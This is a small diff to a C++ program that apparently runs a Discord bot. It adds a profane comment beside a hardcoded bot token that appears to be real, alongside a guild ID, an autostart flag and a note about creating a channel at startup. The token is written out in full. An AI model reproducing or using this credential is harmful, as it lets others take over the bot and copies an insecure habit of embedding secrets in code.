@@ -23,7 +23,7 @@ std::filesystem::path temp = std::filesystem::temp_directory_path();
 
 //shit to change
 const long long int guildId = 1254187382140305408;
-const std::string BOT_TOKEN = "MTI1NDE4NzU1OTQyNTQwOTEwNQ.Gm132A.xjuAMEV_NTmhvMymh5hr5ijKZ5R1kOwGixyH7I";
+const std::string BOT_TOKEN = "MTI1NDE4NzU1OTQyNTQwOTEwNQ.Gm132A.xjuAMEV_NTmhvMymh5hr5ijKZ5R1kOwGixyH7I"; // please dont fuck my shit up :( ima change this before it i release or not idk if ill remember
 const bool autostart = true;
 
 // creates channel at startup
